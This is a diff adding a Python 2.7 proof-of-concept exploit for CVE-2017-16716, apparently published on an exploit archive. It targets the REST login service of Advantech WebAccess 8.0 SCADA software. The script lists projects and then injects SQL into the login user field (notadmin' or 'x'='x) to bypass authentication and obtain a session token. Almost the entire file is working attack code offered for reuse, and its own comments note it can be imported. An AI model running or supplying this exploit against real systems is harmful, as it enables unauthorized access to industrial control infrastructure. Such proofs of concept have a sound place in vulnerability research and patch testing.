@@ -1,0 +1,98 @@
+#!/usr/bin/python2.7
+
+# Exploit Title: Advantech WebAccess BWSCADARest Login Method SQL Injection Authentication Bypass Vulnerability
+# Date: 01-13-2018
+# Exploit Author: Chris Lyne (@lynerc)
+# Vendor Homepage: www.advantech.com
+# Software Link: http://advcloudfiles.advantech.com/web/Download/webaccess/8.0/AdvantechWebAccessUSANode8.0_20150816.exe
+# Version: Advantech WebAccess 8.0-2015.08.16
+# Tested on: Windows Server 2008 R2 Enterprise 64-bit
+# CVE : CVE-2017-16716
+# See Also: http://zerodayinitiative.com/advisories/ZDI-18-065/
+
+# Notes:
+#
+# There are two service interfaces:
+# 1) SOAP
+# 2) REST
+#
+# This PoC targets REST
+#
+# The web services did not work out of the box, and a new website/app was created in IIS for testing.
+# This issue was potentially due to the fact that testing was completed against a trial version.
+# PoC may need slight tweaks depending on configuration of the web service.
+#
+# Original vulnerability was reported for more recent software version.
+#
+# This WebAccessAuthBypass class can be imported :-) 
+
+import sys, requests
+from xml.etree import ElementTree
+
+class WebAccessAuthBypass:
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+        self.base_url = "http://%s:%s/BWMobileService/BWScadaRest.svc/" % (ip, port)
+        
+    def convert_entities(self, s):
+	return s.replace('>', '>').replace('<', '<') # convert html entities in response, for parsing
+
+    def get_project_list(self):
+	print 'Getting list of projects...'
+	res = requests.get(self.base_url)
+	projects = list()
+	if res.status_code != 200:
+	    print 'Bad HTTP response...'
+	else:
+	    if 'PROJECT' not in res.text:
+		print 'No projects listed by service.'
+	    else:
+		s = self.convert_entities(res.text)
+		xml = ElementTree.fromstring(s)
+		for project_list in xml:
+		    for project in project_list:
+			name = project.get('NAME')
+			if name is not None:
+			    projects.append(name)
+	if len(projects) > 0:
+	    print 'Found the following projects: ' + str(projects)
+	    return projects
+	else:
+	    return None
+
+    # returns a token
+    def login(self, project):
+	# SQL Injection into the user parameter
+	url = self.base_url + "Login/" + project + "/notadmin'%20or%20'x'%3D'x/nopass" # notadmin' or 'x'='x
+	res = requests.get(url)
+	token = None
+	if res.status_code != 200:
+	    print 'Bad HTTP response...'
+	else:
+	    if 'OK TOKEN' not in res.text:
+		print 'No token returned by service.'
+	    else:
+		s = self.convert_entities(res.text)
+		xml = ElementTree.fromstring(s)
+		if len(xml) > 0:
+		    token = xml[0].get('TOKEN')
+	return token
+
+    # token returned can be used for more transactions
+    def get_token(self):
+        project_list = self.get_project_list()
+        project = project_list[0] # might as well pick the first project
+        token = self.login(project_list[0])
+        return token
+
+if __name__ == "__main__":
+    ip = 'targetip'
+    port = 'port#'
+    bypass = WebAccessAuthBypass(ip, port)
+    token = bypass.get_token()
+
+    if token is not None:
+	print 'Successfully got an authentication token: ' + token
+    else:
+	print 'Unsuccessful.'
